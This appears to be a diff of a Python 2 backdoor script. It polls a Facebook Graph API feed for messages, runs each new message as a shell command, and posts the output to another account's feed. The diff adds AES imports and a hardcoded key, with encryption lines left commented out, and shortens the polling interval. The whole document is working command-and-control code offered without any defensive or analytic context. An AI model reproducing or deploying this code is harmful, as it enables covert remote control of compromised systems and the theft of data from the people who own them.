@@ -5,6 +5,8 @@ import httplib
 import urllib
 import json
 import time
+from Crypto.Cipher import AES
+from Crypto import Random
 
 def exec_command(command):
     proc = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE,\
@@ -23,6 +25,10 @@ access_token1 = sys.argv[2]
 userid2 = sys.argv[3]
 access_token2 = sys.argv[4]
 
+#key = b'lablanquetteestbonnebienbonneoui'
+#iv = Random.new().read(AES.block_size)
+#cipher = AES.new(key, AES.MODE_CFB, iv)
+
 prev = ""
 while 1:
     conn = httplib.HTTPSConnection("graph.facebook.com")
@@ -33,8 +39,10 @@ while 1:
     if message_id != prev:
 	prev = message_id
 	command = json_rep['data'][0]['message']
+	#command = cipher.decrypt(command)
 	(out, err) = exec_command(command)
 	result = "out :\n" + out + "err :\n" + err
+	#result = iv + cipher.encrypt(result)
 	params = urllib.urlencode({'access_token': access_token2,
 	    'message':result})
 	conn.close()
@@ -42,4 +50,4 @@ while 1:
 	conn.request("POST", "/" + userid2+ "/feed", params)
 	conn.getresponse()
     conn.close()
-    time.sleep(3)
+    time.sleep(1)
